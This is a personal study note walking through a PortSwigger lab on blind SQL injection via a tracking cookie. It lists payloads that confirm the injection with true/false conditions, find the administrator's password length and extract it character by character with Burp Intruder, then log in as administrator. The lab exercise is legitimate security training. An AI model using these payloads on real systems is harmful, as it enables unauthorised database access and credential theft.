---
{"dg-publish":true,"permalink":"/cybersecurity/pentesting/d11-05-mar/lab-blind-sql-injection-with-conditional-responses/"}
---

# **Blind SQL injection with conditional responses**

[Access the PortSwigger lab](https://portswigger.net/web-security/sqlinjection/blind/lab-conditional-responses)

*Note :*
- analyse the app & ask the developer which part of the request is executing sql query at the backend

### Exploiting Blind SQL Injection via Cookies

1️⃣ Vulnerability: The app uses a tracking cookie in an SQL query but does not show query results or errors.

2️⃣ Indicator: If the query returns rows, a "Welcome back" message appears—this confirms the injection.

3️⃣ Confirm SQL Injection: 
-  Set TrackingID=xyz' AND '1'='1 → If "Welcome back" appears, it's vulnerable.
- Set TrackingID=xyz' AND '1'='2 → If message disappears, injection is confirmed.

- On true condition -images will be loaded/response contains specific mssg/response contains one specific msg
- on false condition - images will disappear/response wont contain specific mssg/response contains another specific msg

#### Step 1 : 1st method : boolean method → 1' AND 10=10 `#`
![attachments/Pasted image 20250319192531.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319192531.png)

#### Step 2 : intercept on → view details →
![attachments/Pasted image 20250319192617.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319192617.png)

#### Step 3 : send to repeater
![attachments/Pasted image 20250319192629.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319192629.png)

#### Step 4 : without tampering the tracking id we get the welcome back mssg
![attachments/Pasted image 20250319192702.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319192702.png)

#### Step 5 : now when we tamper the tracking id -->we aint getting the welcome back mssg
![attachments/Pasted image 20250319192733.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319192733.png)

#### Step 6 : now giving a true condition in tampering id → you can seee the welcome back mssg
![attachments/Pasted image 20250319192809.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319192809.png)

#### Step 7 : now give a false condition → you cant see the welcome back mssg
![attachments/Pasted image 20250319192840.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319192840.png)

#### Step 8 : TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
![attachments/Pasted image 20250319192916.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319192916.png)

- explanation:
![attachments/Pasted image 20250319192938.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319192938.png)

#### Step 9 : ' AND (SELECT 'a' FROM users WHERE username='administrator')='a
![attachments/Pasted image 20250319193014.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319193014.png)

- explanation:
![attachments/Pasted image 20250319193034.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319193034.png)

#### Step 10 : ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
![attachments/Pasted image 20250319193112.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319193112.png)

![attachments/Pasted image 20250319193126.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319193126.png)

#### Step 11 :' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
![attachments/Pasted image 20250319193207.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319193207.png)

![attachments/Pasted image 20250319193216.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319193216.png)

#### Step 12 : so after writting ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a
- we can see that we cant see welcome back so the password has 20 characters
![attachments/Pasted image 20250319193327.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319193327.png)

- how do we know its 20??
- now from repeater → send to intruder

![attachments/Pasted image 20250319193357.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319193357.png)

- now in intruder edit the tracking id :
' AND (SELECT 'a' FROM users WHERE username='administrator' AND
LENGTH(password)>1)='a
- select the payload 1 in order to know how many characters does the password has.
![attachments/Pasted image 20250319193442.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319193442.png)

- select the payloads type as numbers. and do the rest from the below screenshot.
![attachments/Pasted image 20250319193543.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319193543.png)

- go to settings → grep match → Welcome back (as we are checking for welcome back ) → add it
![attachments/Pasted image 20250319193617.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319193617.png)

- now from 0 -19 , we are getting 1 in the weclome back column , after that we aint gettting 1 , so hereby we know that from 0-19 there are 20 characters so the password is of 20 characters.
![attachments/Pasted image 20250319193653.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319193653.png)

- Now again go to intruder and edit the following
trackign id :
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a 
- set the attack type as : Cluster bomb
![attachments/Pasted image 20250319193733.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319193733.png)

- for payload 1 do the following settings
![attachments/Pasted image 20250319193753.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319193753.png)

- for payload 2 do the the following settings
![attachments/Pasted image 20250319193813.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319193813.png)

- go to grep match and settings add welcome back.
![attachments/Pasted image 20250319193841.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319193841.png)

- now your password is these : cqasso52s97tr1nmimol
![attachments/Pasted image 20250319193911.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319193911.png)

- now go to login page : administrator 
- password :cqasso52s97tr1nmimol

![attachments/Pasted image 20250319193958.png](/img/user/Cybersecurity/Pentesting/D11_05%20Mar/attachments/Pasted%20image%2020250319193958.png)

- so you cracked the password and logged inside the admin page !! 🔪🥷🔪

#                                    ---****---

